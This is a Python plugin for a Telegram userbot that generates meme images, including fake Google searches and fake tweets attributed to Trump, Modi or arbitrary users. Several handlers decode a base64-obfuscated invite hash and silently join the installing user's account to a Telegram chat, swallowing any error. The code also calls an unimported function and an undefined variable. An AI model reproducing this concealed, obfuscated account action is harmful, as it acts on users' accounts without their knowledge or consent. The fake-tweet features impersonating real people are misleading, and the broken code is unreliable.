# credits to @mrconfused (@sandy1709) 

#  Copyright (C) 2020  sandeep.n(π.$)
import re
import os
import asyncio
import pybase64
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot.plugins import (
    changemymind,
    deEmojify,
    kannagen,
    moditweet,
    trumptweet,
    tweets,
    fakegs,
    reply_to
)

from ..utils import admin_cmd, edit_or_reply, sudo_cmd

@bot.on(admin_cmd(outgoing=True, pattern="fakegs(?: |$)(.*)", command="fakegs"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="fakegs(?: |$)(.*)", command="fakegs"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    reply_to_id = await reply_to(cat)
    if not text:
        if cat.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await edit_delete(cat, "`What should i search in google.`", 5)
            return
    cate = await edit_or_reply(cat, "`Connecting to https://www.google.com/ ...`")
    if ";" in text:
        search, result = text.split(";")
    else:
        await edit_delete(
            cat,
            "__How should i create meme follow the syntax as show__ `.fakegs top text ; bottom text`",5
        )
        return
    catfile = await fakegs(search,result)
    await asyncio.sleep(2)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)
    

@bot.on(admin_cmd(outgoing=True, pattern="trump(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="trump(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = await reply_to(cat)
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "Send your text to trump so he can tweet.")
                return
        else:
            await edit_or_reply(cat, "send your text to trump so he can tweet.")
            return
    cate = await edit_or_reply(cat, "Requesting trump to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await trumptweet(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)


@bot.on(admin_cmd(outgoing=True, pattern="modi(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="modi(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "Send your text to modi so he can tweet.")
                return
        else:
            await edit_or_reply(cat, "send your text to modi so he can tweet.")
            return
    cate = await edit_or_reply(cat, "Requesting modi to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await moditweet(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)


@bot.on(admin_cmd(outgoing=True, pattern="cmm(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="cmm(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await edit_or_reply(cat, "Give text to write on banner, man")
            return
    cate = await edit_or_reply(cat, "Your banner is under creation wait a sec...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await changemymind(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)


@bot.on(admin_cmd(outgoing=True, pattern="kanna(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="kanna(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "what should kanna write give text ")
                return
        else:
            await edit_or_reply(cat, "what should kanna write give text")
            return
    cate = await edit_or_reply(cat, "Kanna is writing your text...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await kannagen(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)


@bot.on(admin_cmd(outgoing=True, pattern="tweet(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="tweet(?: |$)(.*)"))
async def nekobot(cat):
    if cat.pattern_match.group(1):
        text = cat.pattern_match.group(1)
    else:
        reply_to_id = await cat.get_reply_message()
        text = reply_to_id.text
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not text:
        if cat.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await edit_delete(
                cat,
                "what should I tweet? Give some text and format must be like `.tweet username ; your text` ", 5
            )
            return
    try:
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    if ";" in text:
        username, text = text.split(";")
    else:
        await edit_delete(
            cat,
            "what should I tweet? Give some text and format must be like `.tweet username ; your text`",5
        )
        return
    cate = await edit_or_reply(cat, f"Requesting {username} to tweet...")
    text = deEmojify(text)
    catfile = await tweets(text, username)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
    if os.path.exists(catfile):
        os.remove(catfile)
